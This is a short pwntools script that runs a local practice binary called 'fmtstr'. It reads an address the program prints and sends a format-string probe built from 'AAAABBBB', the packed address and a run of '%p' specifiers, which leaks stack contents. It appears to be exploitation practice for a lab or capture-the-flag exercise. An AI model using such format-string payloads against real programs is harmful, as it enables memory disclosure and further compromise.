from pwn import *
from pwn import p64

def main():
    e = ELF('../Machines/fmtstr')
    p = process(e.path)

    data_addr = int((p.recvline().decode().split())[-1].replace('\n', ''), 16)
    print(p64(data_addr))
    p.sendline(b'AAAABBBB' + p64(data_addr) + b'%p %p %p %p %p')
    print(p.recv())


if __name__ == '__main__':
    main()